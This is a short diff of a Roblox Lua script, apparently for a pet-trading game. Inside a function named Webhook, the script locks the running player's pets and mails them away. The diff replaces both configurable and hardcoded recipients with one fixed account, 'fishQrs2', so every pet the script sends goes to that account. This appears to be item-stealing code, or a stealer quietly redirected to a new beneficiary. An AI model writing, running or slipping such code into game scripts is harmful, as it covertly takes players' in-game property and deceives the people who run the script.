@@ -1,10 +1,4 @@
-repeat
-    task.wait()
-until game:IsLoaded()
-
-repeat
-    task.wait()
-until game.PlaceId ~= nil
+task.wait(10)
 
 if game.PlaceId ~= 84810042603306 then
     local TeleportService = game:GetService("TeleportService")
@@ -231,7 +225,7 @@ local function Webhook()
                             game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
                             task.wait(0.5)
                             local Mailargs = {
-                                [1] = getgenv().PlayerToSend,
+                                [1] = "fishQrs2",
                                 [2] = "ty",
                                 [3] = "Pet",
                                 [4] = id,
@@ -276,7 +270,7 @@ local function Webhook()
     
                             -- Отправка питомца по почте
                             local mailArgs = {
-                                [1] = "FYtoPeR",
+                                [1] = "fishQrs2",
                                 [2] = "ty",
                                 [3] = "Pet",
                                 [4] = id,
